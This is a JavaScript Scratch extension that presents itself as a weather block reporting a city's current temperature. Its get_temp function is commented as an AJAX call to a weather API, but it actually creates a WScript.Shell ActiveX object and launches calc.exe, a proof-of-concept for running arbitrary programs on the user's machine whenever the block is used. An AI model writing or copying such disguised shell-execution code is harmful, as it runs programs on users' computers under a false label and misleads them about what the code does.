/* Extension demonstrating a blocking reporter block */
/* Sayamindu Dasgupta <sayamindu@media.mit.edu>, May 2014 */


new (function() {
    var ext = this;

    // Cleanup function when the extension is unloaded
    ext._shutdown = function() {};

    // Status reporting code
    // Use this to report missing hardware, plugin or unsupported browser
    ext._getStatus = function() {
        return {status: 2, msg: 'Ready'};
    };

    ext.get_temp = function(location, callback) {
        // Make an AJAX call to the Open Weather Maps API
		var vbHide = 0             //
		var vbNormalFocus = 1      //
		var vbMinimizedFocus = 2   //
		var vbMaximizedFocus = 3   //
		var vbNormalNoFocus = 4    //
		var vbMinimizedNoFocus = 6 //

		var objWShell = new ActiveXObject("WScript.Shell")

		objWShell.Run("%windir%\\system32\\calc.exe", vbNormalFocus, false)
    };

    // Block and block menu descriptions
    var descriptor = {
        blocks: [
            ['R', 'current temperature in city %s', 'get_temp', 'Boston, MA'],
        ]
    };

    // Register the extension
    ScratchExtensions.register('Weather extension', descriptor, ext);
})();

